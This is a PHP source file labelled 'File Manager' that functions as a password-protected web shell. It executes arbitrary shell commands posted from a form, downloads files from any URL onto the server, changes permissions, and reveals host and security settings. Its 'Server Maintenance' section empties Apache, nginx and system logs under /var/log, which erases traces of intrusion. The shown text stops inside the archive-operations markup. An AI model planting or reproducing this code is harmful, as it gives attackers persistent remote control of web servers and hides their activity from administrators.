<?php

session_start();

$PASS_HASH = "de5d406f5a9cc2aef32554cf0d523c7b";

if (!isset($_SESSION['auth'])) {

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {

        if (md5($_POST['password']) === $PASS_HASH) {

            $_SESSION['auth'] = true;

            header("Location: ?");

            exit;

        } else {

            $error = "Wrong password.";

        }

    }

    ?><!DOCTYPE html>

<html lang="en">

<head>

    <title>Login - File Manager</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta charset="UTF-8">

    <script src="https://cdn.tailwindcss.com"></script>

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    colors: {

                        'dark': {

                            50: '#f8fafc',

                            100: '#f1f5f9',

                            200: '#e2e8f0',

                            300: '#cbd5e1',

                            400: '#94a3b8',

                            500: '#64748b',

                            600: '#475569',

                            700: '#334155',

                            800: '#1e293b',

                            900: '#0f172a',

                            950: '#020617'

                        }

                    }

                }

            }

        }

    </script>

</head>

<body class="bg-dark-950 text-gray-100 min-h-screen flex items-center justify-center font-mono">

    <div class="w-full max-w-md">

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-2xl p-8">

            <h1 class="text-2xl font-bold text-center mb-8 text-gray-100">File Manager Login</h1>

            

            <form method="post" class="space-y-6">

                <div>

                    <label for="password" class="block text-sm font-medium text-gray-300 mb-2">Password</label>

                    <input 

                        type="password" 

                        name="password" 

                        id="password"

                        class="w-full px-3 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-transparent transition duration-200 text-xs" 

                        placeholder="Enter your password" 

                        required

                        autocomplete="current-password">

                </div>

                

                <button 

                    type="submit" 

                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-3 rounded transition duration-200 focus:outline-none focus:ring-1 focus:ring-blue-500 text-xs">

                    Access System

                </button>

                

                <?php if (!empty($error)): ?>

                <div class="mt-4 p-3 bg-red-900/50 border border-red-700 rounded-md text-red-200 text-sm">

                    <?= htmlspecialchars($error) ?>

                </div>

                <?php endif; ?>

            </form>

        </div>

    </div>

</body>

</html>

<?php exit;

}

error_reporting(0); 

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['current_path']) && is_dir($_POST['current_path'])) { 

    $path = realpath($_POST['current_path']); 

} else { 

    $path = realpath($_GET['path'] ?? getcwd()); 

    if (!$path || !is_dir($path)) $path = getcwd(); 

}

if (isset($_GET['edit']) && is_file($_GET['edit'])) { 

    $edit_file = $_GET['edit']; 

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) { 

        file_put_contents($edit_file, $_POST['content']); 

        header("Location: ?path=" . urlencode(dirname($edit_file))); 

        exit; 

    } 

    $content = htmlspecialchars(file_get_contents($edit_file)); 

    ?><!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <title>Edit File - File Manager</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <script src="https://cdn.tailwindcss.com"></script>

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    colors: {

                        'dark': {

                            50: '#f8fafc',

                            100: '#f1f5f9',

                            200: '#e2e8f0',

                            300: '#cbd5e1',

                            400: '#94a3b8',

                            500: '#64748b',

                            600: '#475569',

                            700: '#334155',

                            800: '#1e293b',

                            900: '#0f172a',

                            950: '#020617'

                        }

                    }

                }

            }

        }

    </script>

</head>

<body class="bg-dark-950 text-gray-100 min-h-screen font-mono">

    <div class="container mx-auto p-4">

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl">

            <div class="p-4 border-b border-dark-700">

                <h1 class="text-xl font-bold">Edit File: <?= htmlspecialchars(basename($edit_file)) ?></h1>

                <p class="text-gray-400 text-sm"><?= htmlspecialchars($edit_file) ?></p>

            </div>

            

            <form method="post" class="p-4">

                <textarea 

                    name="content" 

                    class="w-full h-96 bg-dark-800 border border-dark-600 rounded-md p-4 text-gray-100 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none"

                    placeholder="File content..."><?= $content ?></textarea>

                

                <div class="mt-4 flex gap-2">

                    <button 

                        type="submit" 

                        class="bg-green-600 hover:bg-green-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs min-w-[80px]">

                        Save Changes

                    </button>

                    

                    <a 

                        href="?path=<?= urlencode(dirname($edit_file)) ?>" 

                        class="bg-gray-600 hover:bg-gray-700 text-white px-3 py-2 rounded font-medium transition duration-200 inline-block text-xs min-w-[80px] text-center">

                        Cancel

                    </a>

                </div>

            </form>

        </div>

    </div>

</body>

</html>

<?php exit; 

}

if ($_SERVER['REQUEST_METHOD'] === 'POST') { 

    if (isset($_POST['new_folder'])) mkdir($path.'/'.basename($_POST['new_folder'])); 

    if (isset($_FILES['file'])) move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name']); 

    if (isset($_POST['remote_url'])) { 

        $f = basename(parse_url($_POST['remote_url'], PHP_URL_PATH)); 

        file_put_contents($path.'/'.$f, file_get_contents($_POST['remote_url'])); 

    } 

    if (isset($_POST['delete'])) { 

        $t = $path.'/'.$_POST['delete']; 

        is_file($t) ? unlink($t) : rmdir($t); 

    } 

    if (isset($_POST['rename_from'], $_POST['rename_to'])) rename($path.'/'.$_POST['rename_from'], $path.'/'.$_POST['rename_to']); 

    if (isset($_POST['chmod_file'], $_POST['chmod_value'])) chmod($_POST['chmod_file'], octdec($_POST['chmod_value'])); 

    if (isset($_POST['shell_cmd'])) { 

        $cmd = $_POST['shell_cmd']; 

        $handle = popen($cmd." 2>&1", "r"); 

        $output = ''; 

        while (!feof($handle)) $output .= fread($handle, 1024); 

        pclose($handle); 

    } 

    

    // Server Maintenance Actions

    if (isset($_POST['clean_logs'])) {

        $log_output = '';

        $log_paths = [

            '/var/log/apache2/access.log',

            '/var/log/apache2/error.log',

            '/var/log/nginx/access.log',

            '/var/log/nginx/error.log',

            '/var/log/php*.log',

            '/tmp/*.log',

            '/var/log/messages',

            '/var/log/syslog'

        ];

        

        foreach ($log_paths as $log_path) {

            if (file_exists($log_path) && is_writable($log_path)) {

                file_put_contents($log_path, '');

                $log_output .= "Cleaned: $log_path\n";

            }

        }

        

        // Try to clean logs via shell commands

        $cmd = "find /var/log -name '*.log' -type f -writable -exec truncate -s 0 {} \; 2>&1";

        $handle = popen($cmd, "r");

        while (!feof($handle)) $log_output .= fread($handle, 1024);

        pclose($handle);

        

        $maintenance_output = "=== LOG CLEANING RESULTS ===\n" . ($log_output ?: "No accessible log files found or permission denied.");

    }

    

    if (isset($_POST['clear_cache'])) {

        $cache_output = '';

        

        // Clear OPcache

        if (function_exists('opcache_reset')) {

            opcache_reset();

            $cache_output .= "OPcache cleared successfully\n";

        }

        

        // Clear LiteSpeed Cache

        $litespeed_commands = [

            '/usr/local/lsws/bin/lshttpd -r',

            '/usr/local/lsws/Example/html/lsphp*/bin/php -r "if(function_exists(\'litespeed_purge_all\')) litespeed_purge_all();"',

            'curl -X PURGE http://localhost/',

            'rm -rf /tmp/lshttpd/cache/*',

            'rm -rf /tmp/lshttpd/swap/*'

        ];

        

        foreach ($litespeed_commands as $cmd) {

            $handle = popen($cmd . " 2>&1", "r");

            $result = '';

            while (!feof($handle)) $result .= fread($handle, 1024);

            pclose($handle);

            

            if (!empty(trim($result))) {

                $cache_output .= "Command: $cmd\n$result\n\n";

            }

        }

        

        // Clear common cache directories

        $cache_dirs = [

            '/tmp/cache/',

            '/var/cache/',

            './cache/',

            './tmp/',

            '/dev/shm/'

        ];

        

        foreach ($cache_dirs as $cache_dir) {

            if (is_dir($cache_dir) && is_writable($cache_dir)) {

                $cmd = "find $cache_dir -type f -name '*cache*' -delete 2>&1";

                $handle = popen($cmd, "r");

                $result = '';

                while (!feof($handle)) $result .= fread($handle, 1024);

                pclose($handle);

                

                if (!empty(trim($result))) {

                    $cache_output .= "Cleared cache in: $cache_dir\n$result\n";

                }

            }

        }

        

        $maintenance_output = "=== CACHE CLEARING RESULTS ===\n" . ($cache_output ?: "Cache clearing completed. Some operations may require elevated permissions.");

    }

    

    if (isset($_POST['clear_temp'])) {

        $temp_output = '';

        

        $temp_dirs = [

            '/tmp/',

            '/var/tmp/',

            sys_get_temp_dir()

        ];

        

        foreach ($temp_dirs as $temp_dir) {

            if (is_dir($temp_dir) && is_writable($temp_dir)) {

                $cmd = "find $temp_dir -type f -atime +1 -delete 2>&1";

                $handle = popen($cmd, "r");

                $result = '';

                while (!feof($handle)) $result .= fread($handle, 1024);

                pclose($handle);

                

                $temp_output .= "Cleaned temp files in: $temp_dir\n";

            }

        }

        

        $maintenance_output = "=== TEMP FILE CLEANING RESULTS ===\n" . ($temp_output ?: "Temp file cleaning completed.");

    }

    

    // Archive Operations

    if (isset($_POST['zip_files'], $_POST['zip_name'])) {

        $archive_output = '';

        $zip_name = basename($_POST['zip_name']) . '.zip';

        $zip_path = $path . '/' . $zip_name;

        

        // Get selected files

        $files_to_zip = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];

        

        if (empty($files_to_zip)) {

            $archive_output = "Error: No files selected for compression.";

        } else {

            // Try PHP ZipArchive first

            if (class_exists('ZipArchive')) {

                $zip = new ZipArchive();

                $result = $zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE);

                

                if ($result === TRUE) {

                    foreach ($files_to_zip as $file) {

                        $file_path = $path . '/' . $file;

                        if (is_file($file_path)) {

                            $zip->addFile($file_path, $file);

                        } elseif (is_dir($file_path)) {

                            $iterator = new RecursiveIteratorIterator(

                                new RecursiveDirectoryIterator($file_path),

                                RecursiveIteratorIterator::SELF_FIRST

                            );

                            

                            foreach ($iterator as $item) {

                                if ($item->isFile()) {

                                    $zip->addFile($item->getPathname(), $file . '/' . $iterator->getSubPathName());

                                }

                            }

                        }

                    }

                    

                    $zip->close();

                    $archive_output = "ZIP created successfully: $zip_name\nFiles included: " . implode(', ', $files_to_zip);

                } else {

                    $archive_output = "Error: Could not create ZIP file. Error code: $result";

                }

            } else {

                // Fallback to shell command

                $files_list = implode(' ', array_map('escapeshellarg', $files_to_zip));

                $cmd = "cd " . escapeshellarg($path) . " && zip -r " . escapeshellarg($zip_name) . " $files_list 2>&1";

                

                $handle = popen($cmd, "r");

                while (!feof($handle)) $archive_output .= fread($handle, 1024);

                pclose($handle);

            }

        }

        

        $maintenance_output = "=== ZIP OPERATION RESULTS ===\n" . $archive_output;

    }

    

    if (isset($_POST['unzip_file'])) {

        $archive_output = '';

        $zip_file = $path . '/' . $_POST['unzip_file'];

        

        if (!file_exists($zip_file)) {

            $archive_output = "Error: Archive file not found.";

        } else {

            // Try PHP ZipArchive first

            if (class_exists('ZipArchive')) {

                $zip = new ZipArchive();

                $result = $zip->open($zip_file);

                

                if ($result === TRUE) {

                    $extract_path = $path . '/' . pathinfo($_POST['unzip_file'], PATHINFO_FILENAME);

                    

                    if (!is_dir($extract_path)) {

                        mkdir($extract_path, 0755, true);

                    }

                    

                    $zip->extractTo($extract_path);

                    $zip->close();

                    

                    $archive_output = "Archive extracted successfully to: " . basename($extract_path) . "\n";

                    $archive_output .= "Extracted " . $zip->numFiles . " files.";

                } else {

                    $archive_output = "Error: Could not open ZIP file. Error code: $result";

                }

            } else {

                // Fallback to shell command

                $extract_dir = pathinfo($_POST['unzip_file'], PATHINFO_FILENAME);

                $cmd = "cd " . escapeshellarg($path) . " && mkdir -p " . escapeshellarg($extract_dir) . " && unzip -o " . escapeshellarg($_POST['unzip_file']) . " -d " . escapeshellarg($extract_dir) . " 2>&1";

                

                $handle = popen($cmd, "r");

                while (!feof($handle)) $archive_output .= fread($handle, 1024);

                pclose($handle);

            }

        }

        

        $maintenance_output = "=== UNZIP OPERATION RESULTS ===\n" . $archive_output;

    }

    

    if (isset($_POST['create_folder_zip'])) {

        $archive_output = '';

        $folder_name = $_POST['folder_to_zip'];

        $folder_path = $path . '/' . $folder_name;

        $zip_name = $folder_name . '.zip';

        $zip_path = $path . '/' . $zip_name;

        

        if (!is_dir($folder_path)) {

            $archive_output = "Error: Folder not found.";

        } else {

            // Try PHP ZipArchive first

            if (class_exists('ZipArchive')) {

                $zip = new ZipArchive();

                $result = $zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE);

                

                if ($result === TRUE) {

                    $iterator = new RecursiveIteratorIterator(

                        new RecursiveDirectoryIterator($folder_path),

                        RecursiveIteratorIterator::SELF_FIRST

                    );

                    

                    foreach ($iterator as $item) {

                        if ($item->isFile()) {

                            $zip->addFile($item->getPathname(), $folder_name . '/' . $iterator->getSubPathName());

                        }

                    }

                    

                    $zip->close();

                    $archive_output = "Folder compressed successfully: $zip_name";

                } else {

                    $archive_output = "Error: Could not create ZIP file. Error code: $result";

                }

            } else {

                // Fallback to shell command

                $cmd = "cd " . escapeshellarg($path) . " && zip -r " . escapeshellarg($zip_name) . " " . escapeshellarg($folder_name) . " 2>&1";

                

                $handle = popen($cmd, "r");

                while (!feof($handle)) $archive_output .= fread($handle, 1024);

                pclose($handle);

            }

        }

        

        $maintenance_output = "=== FOLDER ZIP OPERATION RESULTS ===\n" . $archive_output;

    }

}

$files = scandir($path); 

?>

<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <title>File Manager</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <script src="https://cdn.tailwindcss.com"></script>

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    colors: {

                        'dark': {

                            50: '#f8fafc',

                            100: '#f1f5f9',

                            200: '#e2e8f0',

                            300: '#cbd5e1',

                            400: '#94a3b8',

                            500: '#64748b',

                            600: '#475569',

                            700: '#334155',

                            800: '#1e293b',

                            900: '#0f172a',

                            950: '#020617'

                        }

                    }

                }

            }

        }

    </script>

</head>

<body class="bg-dark-950 text-gray-100 min-h-screen font-mono">

    <div class="container mx-auto p-4 max-w-7xl">

        <!-- Header -->

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl mb-6">

            <div class="p-4 border-b border-dark-700">

                <h1 class="text-2xl font-bold">File Manager</h1>

                <p class="text-gray-400 text-sm break-all"><?= htmlspecialchars($path) ?></p>

            </div>

            

            <!-- System Information -->

            <?php

            // Get system information

            $system_info = [

                'hostname' => gethostname(),

                'os' => PHP_OS_FAMILY . ' ' . php_uname('r'),

                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',

                'php_version' => PHP_VERSION,

                'memory_limit' => ini_get('memory_limit'),

                'memory_usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',

                'memory_peak' => round(memory_get_peak_usage(true) / 1024 / 1024, 2) . ' MB',

                'disk_free' => disk_free_space($path) ? round(disk_free_space($path) / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',

                'disk_total' => disk_total_space($path) ? round(disk_total_space($path) / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',

                'current_user' => get_current_user(),

                'server_time' => date('Y-m-d H:i:s T'),

                'timezone' => date_default_timezone_get(),

                'max_execution_time' => ini_get('max_execution_time') . 's',

                'upload_max_filesize' => ini_get('upload_max_filesize'),

                'post_max_size' => ini_get('post_max_size')

            ];

            

            // Get load average (Unix/Linux only)

            $load_avg = 'N/A';

            if (function_exists('sys_getloadavg') && PHP_OS_FAMILY !== 'Windows') {

                $load = sys_getloadavg();

                $load_avg = round($load[0], 2) . ', ' . round($load[1], 2) . ', ' . round($load[2], 2);

            }

            

            // Get uptime (Unix/Linux only)

            $uptime = 'N/A';

            if (PHP_OS_FAMILY !== 'Windows' && is_readable('/proc/uptime')) {

                $uptime_seconds = (int)file_get_contents('/proc/uptime');

                $days = floor($uptime_seconds / 86400);

                $hours = floor(($uptime_seconds % 86400) / 3600);

                $minutes = floor(($uptime_seconds % 3600) / 60);

                $uptime = $days . 'd ' . $hours . 'h ' . $minutes . 'm';

            }

            

            // Get disk usage percentage

            $disk_usage_percent = 'N/A';

            if (disk_total_space($path) && disk_free_space($path)) {

                $total = disk_total_space($path);

                $free = disk_free_space($path);

                $used = $total - $free;

                $disk_usage_percent = round(($used / $total) * 100, 1) . '%';

            }

            

            // Count PHP extensions

            $extensions_count = count(get_loaded_extensions());

            ?>

            

            <div class="p-4 border-b border-dark-700">

                <h2 class="text-lg font-bold mb-4 text-blue-400">System Information</h2>

                

                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">

                    <!-- Server Info -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Server</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Hostname:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['hostname']) ?></span></div>

                            <div><span class="text-gray-400">OS:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['os']) ?></span></div>

                            <div><span class="text-gray-400">Software:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['server_software']) ?></span></div>

                            <div><span class="text-gray-400">User:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['current_user']) ?></span></div>

                        </div>

                    </div>

                    

                    <!-- PHP Info -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">PHP</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Version:</span> <span class="text-green-400 font-medium"><?= htmlspecialchars($system_info['php_version']) ?></span></div>

                            <div><span class="text-gray-400">Extensions:</span> <span class="text-gray-200"><?= $extensions_count ?> loaded</span></div>

                            <div><span class="text-gray-400">Max Exec Time:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['max_execution_time']) ?></span></div>

                            <div><span class="text-gray-400">Timezone:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['timezone']) ?></span></div>

                        </div>

                    </div>

                    

                    <!-- Memory Info -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Memory</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Limit:</span> <span class="text-yellow-400"><?= htmlspecialchars($system_info['memory_limit']) ?></span></div>

                            <div><span class="text-gray-400">Current:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['memory_usage']) ?></span></div>

                            <div><span class="text-gray-400">Peak:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['memory_peak']) ?></span></div>

                            <div><span class="text-gray-400">Upload Max:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['upload_max_filesize']) ?></span></div>

                        </div>

                    </div>

                    

                    <!-- Disk Info -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Storage</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Total:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['disk_total']) ?></span></div>

                            <div><span class="text-gray-400">Free:</span> <span class="text-green-400"><?= htmlspecialchars($system_info['disk_free']) ?></span></div>

                            <div><span class="text-gray-400">Usage:</span> <span class="text-orange-400"><?= htmlspecialchars($disk_usage_percent) ?></span></div>

                            <div><span class="text-gray-400">Post Max:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['post_max_size']) ?></span></div>

                        </div>

                    </div>

                    

                    <!-- System Stats -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Performance</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Load Avg:</span> <span class="text-blue-400"><?= htmlspecialchars($load_avg) ?></span></div>

                            <div><span class="text-gray-400">Uptime:</span> <span class="text-gray-200"><?= htmlspecialchars($uptime) ?></span></div>

                            <div><span class="text-gray-400">Server Time:</span> <span class="text-gray-200"><?= htmlspecialchars($system_info['server_time']) ?></span></div>

                            <div><span class="text-gray-400">Files in Dir:</span> <span class="text-purple-400"><?= count($files) - 2 ?></span></div>

                        </div>

                    </div>

                    

                    <!-- Security & Permissions -->

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Security</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Safe Mode:</span> <span class="<?= ini_get('safe_mode') ? 'text-red-400' : 'text-green-400' ?>"><?= ini_get('safe_mode') ? 'On' : 'Off' ?></span></div>

                            <div><span class="text-gray-400">Open Basedir:</span> <span class="<?= ini_get('open_basedir') ? 'text-green-400' : 'text-yellow-400' ?>"><?= ini_get('open_basedir') ? 'Restricted' : 'Unrestricted' ?></span></div>

                            <div><span class="text-gray-400">File Uploads:</span> <span class="<?= ini_get('file_uploads') ? 'text-green-400' : 'text-red-400' ?>"><?= ini_get('file_uploads') ? 'Enabled' : 'Disabled' ?></span></div>

                            <div><span class="text-gray-400">Allow URL fopen:</span> <span class="<?= ini_get('allow_url_fopen') ? 'text-yellow-400' : 'text-green-400' ?>"><?= ini_get('allow_url_fopen') ? 'Yes' : 'No' ?></span></div>

                        </div>

                    </div>

                    

                    <!-- Database Info -->

                    <?php

                    $db_info = [];

                    if (extension_loaded('mysqli')) $db_info[] = 'MySQL';

                    if (extension_loaded('pgsql')) $db_info[] = 'PostgreSQL';

                    if (extension_loaded('sqlite3')) $db_info[] = 'SQLite';

                    if (extension_loaded('redis')) $db_info[] = 'Redis';

                    if (extension_loaded('memcached')) $db_info[] = 'Memcached';

                    ?>

                    <div class="bg-dark-800 rounded-lg p-3">

                        <h3 class="text-sm font-semibold text-gray-300 mb-2">Database</h3>

                        <div class="space-y-1 text-xs">

                            <div><span class="text-gray-400">Available:</span> <span class="text-cyan-400"><?= empty($db_info) ? 'None' : implode(', ', $db_info) ?></span></div>

                            <div><span class="text-gray-400">PDO:</span> <span class="<?= extension_loaded('pdo') ? 'text-green-400' : 'text-red-400' ?>"><?= extension_loaded('pdo') ? 'Available' : 'Not Available' ?></span></div>

                            <div><span class="text-gray-400">cURL:</span> <span class="<?= extension_loaded('curl') ? 'text-green-400' : 'text-red-400' ?>"><?= extension_loaded('curl') ? 'Available' : 'Not Available' ?></span></div>

                            <div><span class="text-gray-400">JSON:</span> <span class="<?= extension_loaded('json') ? 'text-green-400' : 'text-red-400' ?>"><?= extension_loaded('json') ? 'Available' : 'Not Available' ?></span></div>

                        </div>

                    </div>

                </div>

            </div>

            

            <!-- Navigation and Actions -->

            <div class="p-4 space-y-4">

                <!-- Breadcrumb Navigation -->

                <div class="space-y-3">

                    <div class="flex items-center gap-2 text-sm">

                        <span class="text-gray-400 font-medium">Path:</span>

                        <nav class="flex items-center space-x-1 flex-wrap">

                            <?php

                            // Home button - back to script location

                            $script_dir = dirname(__FILE__);

                            echo '<a href="?path=' . urlencode($script_dir) . '" class="px-3 py-1 bg-green-600 hover:bg-green-700 text-white rounded transition duration-200 font-medium flex items-center gap-1" title="Back to script location">';

                            echo 'Home';

                            echo '</a>';

                            

                            echo '<span class="text-gray-500 mx-2">|</span>';

                            

                            // Generate breadcrumb navigation

                            $path_parts = explode('/', trim($path, '/'));

                            $current_path = '';

                            

                            // Root directory

                            echo '<a href="?path=" class="px-2 py-1 bg-dark-800 hover:bg-blue-600 text-gray-300 hover:text-white rounded transition duration-200 font-medium">/</a>';

                            

                            foreach ($path_parts as $index => $part) {

                                if (empty($part)) continue;

                                

                                $current_path .= '/' . $part;

                                $is_last = ($index === count($path_parts) - 1);

                                

                                echo '<span class="text-gray-500">/</span>';

                                

                                if ($is_last) {

                                    // Current directory - not clickable

                                    echo '<span class="px-2 py-1 bg-blue-600 text-white rounded font-medium">' . htmlspecialchars($part) . '</span>';

                                } else {

                                    // Clickable breadcrumb

                                    echo '<a href="?path=' . urlencode($current_path) . '" class="px-2 py-1 bg-dark-800 hover:bg-blue-600 text-gray-300 hover:text-white rounded transition duration-200 font-medium">' . htmlspecialchars($part) . '</a>';

                                }

                            }

                            ?>

                        </nav>

                    </div>

                    

                    <!-- Manual Path Input (Collapsible) -->

                    <div class="border-t border-dark-700 pt-3">

                        <button 

                            id="toggle-manual-path" 

                            class="text-xs text-gray-400 hover:text-gray-300 transition duration-200 mb-2 flex items-center gap-1">

                            <span id="toggle-icon">▶</span> Manual Path Entry

                        </button>

                        

                        <form method="get" id="manual-path-form" class="hidden">

                            <div class="flex gap-2">

                                <input 

                                    type="text" 

                                    name="path" 

                                    placeholder="Enter full path (e.g., /home/user/documents)" 

                                    value="<?= htmlspecialchars($path) ?>"

                                    class="flex-1 px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 text-xs">

                                <button 

                                    type="submit" 

                                    class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs whitespace-nowrap min-w-[60px]">

                                    Go

                                </button>

                            </div>

                        </form>

                    </div>

                </div>

                

                <!-- Quick Actions Grid -->

                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">

                    <!-- Create Folder -->

                    <form method="post" class="flex gap-2">

                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                        <input 

                            type="text" 

                            name="new_folder" 

                            placeholder="Folder name" 

                            required

                            class="flex-1 px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-green-500 text-xs">

                        <button 

                            type="submit" 

                            class="bg-green-600 hover:bg-green-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs whitespace-nowrap min-w-[60px]">

                            Create

                        </button>

                    </form>

                    

                    <!-- File Upload -->

                    <form method="post" enctype="multipart/form-data" class="flex gap-2">

                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                        <div class="flex-1 relative">

                            <input 

                                type="file" 

                                name="file" 

                                id="file-upload"

                                required

                                class="absolute inset-0 w-full h-full opacity-0 cursor-pointer">

                            <div class="px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 text-xs flex items-center justify-between cursor-pointer hover:bg-dark-700 transition duration-200">

                                <span id="file-name" class="text-gray-400 truncate">Choose file...</span>

                                <span class="text-gray-500 text-xs ml-1">Browse</span>

                            </div>

                        </div>

                        <button 

                            type="submit" 

                            class="bg-purple-600 hover:bg-purple-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs whitespace-nowrap min-w-[60px]">

                            Upload

                        </button>

                    </form>

                    

                    <!-- Remote Fetch -->

                    <form method="post" class="flex gap-2">

                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                        <input 

                            type="url" 

                            name="remote_url" 

                            placeholder="Remote URL" 

                            required

                            class="flex-1 px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-yellow-500 text-xs">

                        <button 

                            type="submit" 

                            class="bg-yellow-600 hover:bg-yellow-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs whitespace-nowrap min-w-[60px]">

                            Fetch

                        </button>

                    </form>

                    

                    <!-- Shell Command -->

                    <form method="post" class="flex gap-2">

                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                        <input 

                            type="text" 

                            name="shell_cmd" 

                            placeholder="Shell command"

                            class="flex-1 px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-red-500 text-xs">

                        <button 

                            type="submit" 

                            class="bg-red-600 hover:bg-red-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs whitespace-nowrap min-w-[60px]">

                            Execute

                        </button>

                    </form>

                </div>

                

                <!-- Archive Operations -->

                <div class="mt-3 p-3 bg-dark-800 border border-dark-600 rounded">

                    <h3 class="text-xs font-bold text-cyan-400 mb-2">Archive Operations</h3>

                    

                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-3">

                        <!-- Create ZIP from multiple files -->

                        <div class="space-y-2">

                            <label class="text-xs text-gray-300 font-medium">Create ZIP Archive</label>

                            <form method="post" id="zip-form" class="space-y-2">

                                <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                <input type="hidden" name="zip_files" value="1">

                                

                                <input 

                                    type="text" 

                                    name="zip_name" 

                                    placeholder="Archive name (without .zip)" 

                                    required

                                    class="w-full px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-cyan-500 text-xs">

                                                           

                                <button 

                                    type="submit" 

                                    class="w-full bg-cyan-600 hover:bg-cyan-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs"

                                    onclick="return validateZipSelection()">

                                    Create ZIP

                                </button>

                            </form>

                        </div>

                        

                        <!-- Quick Folder ZIP -->

                        <div class="space-y-2">

                            <label class="text-xs text-gray-300 font-medium">Quick Folder ZIP</label>

                            <form method="post" class="space-y-2">

                                <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                <input type="hidden" name="create_folder_zip" value="1">

                                

                                <select 

                                    name="folder_to_zip" 

                                    required

                                    class="w-full px-2 py-2 bg-dark-800 border border-dark-600 rounded text-gray-100 focus:outline-none focus:ring-1 focus:ring-cyan-500 text-xs">

                                    <option value="">Select folder to compress...</option>

                                    <?php

                                    foreach ($files as $f) {

                                        if ($f === "." || $f === ".." || !is_dir($path.'/'.$f)) continue;

                                        echo '<option value="' . htmlspecialchars($f) . '">' . htmlspecialchars($f) . '</option>';

                                    }

                                    ?>

                                </select>

                                

                                <button 

                                    type="submit" 

                                    class="w-full bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-2 rounded font-medium transition duration-200 text-xs">

                                    ZIP Folder

                                </button>

                            </form>

                        </div>

                    </div>

                </div>

